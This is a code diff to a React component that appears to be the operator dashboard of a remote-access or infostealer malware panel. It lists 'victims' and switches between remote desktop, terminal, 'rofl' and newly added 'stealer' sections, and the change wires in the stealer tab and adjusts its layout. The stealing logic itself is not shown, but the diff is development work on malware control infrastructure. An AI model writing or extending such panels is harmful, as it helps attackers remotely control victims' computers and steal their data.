@@ -8,6 +8,7 @@ import { DetailSidebar } from "./detail-sidebar";
 import { InformationSection } from "./sections/information-section";
 import { RemoteStartSection } from "./sections/remote-start-section";
 import { RemoteDesktopSection } from "./sections/remote-desktop-section";
+import { StealerSection } from "./sections/stealer-section";
 import { RoflSection } from "./sections/rofl-section";
 import { TerminalSection } from "./sections/terminal-section";
 
@@ -24,7 +25,8 @@ export function DetailView(props: { victims: Victim[] }) {
    }, [selectedVictimId, victimSnapshots, victims]);
 
    const isRemoteDesktop = section === "remote-desktop";
-   const isRofl = section === "rofl";
+   const isTerminal = section === "terminal";
+   const needsScroll = section === "rofl" || section === "stealer";
 
    if (!isOpen) return null;
 
@@ -41,14 +43,17 @@ export function DetailView(props: { victims: Victim[] }) {
                   "detail-main border-l border-[rgba(120,120,120,0.6)] " +
                   (isRemoteDesktop
                      ? "h-full min-h-0 overflow-hidden p-0"
-                     : isRofl
-                        ? "h-full overflow-y-auto p-[12px_14px]"
-                        : "h-auto overflow-y-visible p-[12px_14px]")
+                     : isTerminal
+                        ? "h-full min-h-0 overflow-hidden p-[12px_14px]"
+                        : needsScroll
+                           ? "h-full overflow-y-auto p-[12px_14px]"
+                           : "h-auto overflow-y-visible p-[12px_14px]")
                }
             >
                {section === "information" && <InformationSection victim={victim} />}
                {section === "remote-start" && <RemoteStartSection />}
                {section === "remote-desktop" && <RemoteDesktopSection />}
+               {section === "stealer" && <StealerSection />}
                {section === "rofl" && <RoflSection />}
                {section === "terminal" && <TerminalSection />}
             </div>
